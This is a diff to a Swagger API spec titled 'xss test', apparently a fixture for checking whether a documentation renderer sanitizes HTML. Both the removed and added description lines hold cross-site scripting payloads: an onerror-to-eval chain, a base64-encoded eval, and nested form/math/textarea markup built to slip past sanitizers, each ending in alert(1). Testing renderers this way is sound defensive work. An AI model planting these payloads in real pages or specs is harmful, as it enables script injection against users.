@@ -2,5 +2,4 @@ swagger: '2.0'
 info:
   title: xss test
   description: |
-   <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">123<h1>123</h1><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror="eval(atob('YWxlcnQoMSk='))">
-</form>
+  123<h1>123</h1><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg onload=javascript:alert(1)></form>
